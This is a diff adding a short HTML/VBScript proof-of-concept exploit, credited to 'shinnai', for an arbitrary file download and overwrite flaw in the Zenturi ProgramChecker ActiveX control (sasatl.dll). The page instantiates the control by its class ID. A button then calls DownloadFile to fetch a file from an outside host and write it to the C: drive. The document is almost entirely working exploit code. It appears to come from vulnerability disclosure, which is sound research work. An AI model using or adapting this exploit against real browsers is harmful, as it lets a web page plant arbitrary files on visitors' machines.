@@ -1,0 +1,20 @@
+-------------------------------------------------------------------------------------------
+ MoAxB #30:
+ Zenturi ProgramChecker ActiveX (sasatl.dll) Arbitrary file download/overwrite Exploit
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+-------------------------------------------------------------------------------------------
+
+<object classid='clsid:59DBDDA6-9A80-42A4-B824-9BC50CC172F5' id='test' ></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+Sub tryMe()
+ 
+ test.DownloadFile "http://www.shinnai.altervista.org/shinnai.txt" ,"c:\shinnai.txt" ,"0", "0"
+
+End Sub
+</script>
